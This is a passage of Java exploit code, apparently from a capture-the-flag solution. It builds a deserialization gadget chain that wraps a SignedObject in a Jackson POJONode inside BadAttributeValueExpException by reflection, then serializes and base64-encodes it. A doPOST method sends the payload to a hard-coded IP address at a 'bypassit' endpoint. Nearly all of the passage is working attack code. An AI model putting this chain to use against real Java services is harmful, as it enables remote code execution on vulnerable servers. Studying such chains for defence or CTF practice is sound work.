rator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);        SignedObject signedObject = new SignedObject(exp2,privateKey,signingEngine);        POJONode jsonNodes = new POJONode(signedObject);        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(exp,jsonNodes);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);        objectOutputStream.writeObject(exp);        FileOutputStream fout=new FileOutputStream(&quot;1.ser&quot;);        fout.write(barr.toByteArray());        fout.close();        FileInputStream fileInputStream = new FileInputStream(&quot;1.ser&quot;);        System.out.println(serial(exp));        deserial(serial(exp));        //doPOST(exp.toString().getBytes());        //byte[] byt=new byte[fileInputStream.available()];        //fileInputStream.read(byt);        //doPOST(byt);    &#125;    public static void doPOST(byte[] obj) throws Exception&#123;        HttpHeaders requestHeaders = new HttpHeaders();        requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);        URI url = new URI(&quot;http://112.124.14.13:8080/bypassit&quot;);        //URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);        HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders);        RestTemplate restTemplate = new RestTemplate();        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);        System.out.println(res.getBody());    &#125;    public static String serial(Object o) throws IOException, NoSuchFieldException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);        //writeReplaceMethod.setAccessible(true);        oos.writeObject(o);        oos.close();        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());        return base64String;    &#125;    public static void deserial(String data) throws Exception &#123;        byte[] base64decodedBytes = Base64.getDecoder().decode(data);        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);        ObjectInputStream ois = new ObjectInputStream(bais);        ois.readObject();        ois.close();    &#125;    private static void Base64Encode(ByteArrayOutputStream bs)&#123;        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());        String s = new String(encode);        System.out.println(s);        System.out.println(s.length());    &#125;    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;        Field f = obj.getClass().getDeclaredField(field);        f.setAccessible(true);        f.set(obj, arg);    &#125;    &#125;
